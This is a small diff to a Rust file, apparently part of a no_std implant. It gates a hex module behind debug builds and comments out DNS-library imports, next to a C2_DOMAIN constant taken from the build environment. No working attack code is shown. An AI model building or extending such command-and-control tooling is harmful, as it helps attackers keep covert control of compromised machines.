@@ -4,6 +4,7 @@ extern crate alloc;
 
 mod socket;
 
+#[cfg(debug_assertions)]
 mod hex;
 
 #[cfg(debug_assertions)]
@@ -14,8 +15,8 @@ pub use debug::print;
 
 use talc::{*, source::Claim};
 use alloc::vec::Vec;
-use simple_dns::{Packet, PacketFlag, Question, CLASS, TYPE};
-use simple_dns::rdata::RData;
+// use simple_dns::{Packet, PacketFlag, Question, CLASS, TYPE};
+// use simple_dns::rdata::RData;
 
 
 const C2_DOMAIN: &str = env!("C2_DOMAIN");
